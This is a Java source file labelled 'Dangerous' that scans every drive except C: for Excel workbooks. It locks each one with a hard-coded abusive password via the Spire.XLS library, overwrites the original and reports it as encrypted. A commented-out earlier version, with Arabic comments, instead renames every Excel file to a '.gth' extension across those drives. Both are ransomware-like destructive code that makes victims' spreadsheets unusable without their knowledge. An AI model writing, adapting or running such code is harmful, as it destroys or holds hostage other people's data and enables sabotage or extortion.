





//Dangerous



package newpackage;

import com.spire.xls.ExcelVersion;
import com.spire.xls.Workbook;
import java.io.File;
import java.io.IOException;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.ArrayList;
import java.util.List;
public class ExcelFileFinder {
    public static void main(String[] args) {
        
        
        List<Path> excelFiles = new ArrayList<>();
        File[] roots = File.listRoots();
        for (File root : roots) {
            if (root.toString().equalsIgnoreCase("C:\\")) {
                System.out.println("Skipping C drive.");
                continue;
            }
            Path startPath = root.toPath();
            System.out.println("Searching in drive: " + startPath);
            try {
                Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
                    @Override
                    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                        if (file.toString().toLowerCase().endsWith(".xlsx") ||
                            file.toString().toLowerCase().endsWith(".xls") ||
                            file.toString().toLowerCase().endsWith(".xlsb")) {
                            excelFiles.add(file);
                        }
                        return FileVisitResult.CONTINUE;
                    }
                    @Override
                    public FileVisitResult visitFileFailed(Path file, IOException exc) {
                        System.err.println("Access denied or unable to read: " + file);
                        return FileVisitResult.CONTINUE;
                    }
                });
            } catch (IOException e) {
                System.err.println("Error walking file tree for drive: " + root + " - " + e.getMessage());
            }
        }
        System.out.println("Found " + excelFiles.size() + " Excel files:");
        for (Path excelFile : excelFiles) {
            try {
                System.out.println("Processing file: " + excelFile);
                Workbook workbook = new Workbook();
                workbook.loadFromFile(excelFile.toString());
                String password = "Fuck You";
                workbook.protect(password);
                workbook.saveToFile(excelFile.toString(), ExcelVersion.Version2016);
                System.out.println("File encrypted successfully: " + excelFile);
            } catch (Exception e) {
                System.err.println("Unable to process file: " + excelFile + " - " + e.getMessage());
            }
        }
        
        
        
        
        
    }
}







//
//package newpackage;
//
//import java.io.File;
//import java.io.IOException;
//import java.nio.file.*;
//import java.nio.file.attribute.BasicFileAttributes;
//import java.util.concurrent.atomic.AtomicInteger;
//public class ExcelFileFinder {
//    public static void main(String[] args) {
//
//        
//        
//       
//        
//        
//        AtomicInteger totalFound = new AtomicInteger(0);
//        AtomicInteger totalRenamed = new AtomicInteger(0);
//        AtomicInteger totalFailed = new AtomicInteger(0);
//        //printHeader("بدء البحث عن ملفات Excel في كل الدرايفات (ما عدا C:) ...");
//        File[] roots = File.listRoots(); // C:\, D:\, E:\ ...
//        for (File root : roots) {
//            String drive = root.toString();
//            // نتخطى درايف C:
//            if (drive.equalsIgnoreCase("C:\\")) {
//                //System.out.println("تخطي درايف C: (كما طُلب)");
//                continue;
//            }
//            //System.out.println("جاري البحث في الدرايف: " + drive);
//
//            Path startPath = root.toPath();
//
//            try {
//                Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
//                    @Override
//                    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
//                        String fileName = file.toString().toLowerCase();
//                        if (fileName.endsWith(".xlsx") || 
//                            fileName.endsWith(".xls") || 
//                            fileName.endsWith(".xlsb")) {
//                            totalFound.incrementAndGet();
//                            // نأخذ اسم الملف بدون الامتداد القديم
//                            Path parentDir = file.getParent();
//                            String oldName = file.getFileName().toString();
//                            String newName = oldName.substring(0, oldName.lastIndexOf('.')) + ".gth";
//                            Path newFilePath = parentDir.resolve(newName);
//                            try {
//                                Files.move(file, newFilePath, StandardCopyOption.REPLACE_EXISTING);
//                                //System.out.println("تم: " + oldName + "  →  " + newName);
//                                totalRenamed.incrementAndGet();
//                            } catch (AccessDeniedException e) {
//                                //System.err.println("غير مسموح (مفتوح أو محمي): " + file);
//                                totalFailed.incrementAndGet();
//                            } catch (IOException e) {
//                                //System.err.println("فشل: " + oldName + " → " + e.getMessage());
//                                totalFailed.incrementAndGet();
//                            }
//                        }
//                        return FileVisitResult.CONTINUE;
//                    }
//                    @Override
//                    public FileVisitResult visitFileFailed(Path file, IOException exc) {
//                        // نتجاهل المجلدات المحمية بهدوء
//                        return FileVisitResult.CONTINUE;
//                    }
//                });
//            } catch (Exception e) {
//                //System.err.println("خطأ في الدرايف " + drive + " → " + e.getMessage());
//            }
//        }
//        // طباعة النتيجة النهائية (بدون .repeat)
//        printHeader("انتهى التحويل بنجاح!");
//        //System.out.println("إجمالي الملفات المكتشفة       : " + totalFound.get());
//        //System.out.println("تم تحويلها إلى .gth بنجاح     : " + totalRenamed.get());
//        //System.out.println("فشلت (مفتوحة أو محمية)         : " + totalFailed.get());
//        printHeader("تم يا بطل!");
//    }
//    // دالة بديلة للـ .repeat() في Java 8
//    private static void printHeader(String text) {
//        String line = new String(new char[60]).replace("\0", "=");
//        //System.out.println("\n" + line);
//        //System.out.println(text);
//        //System.out.println(line + "\n");
//    }
//    
//    
//    
//    
//    
//    
//    
//}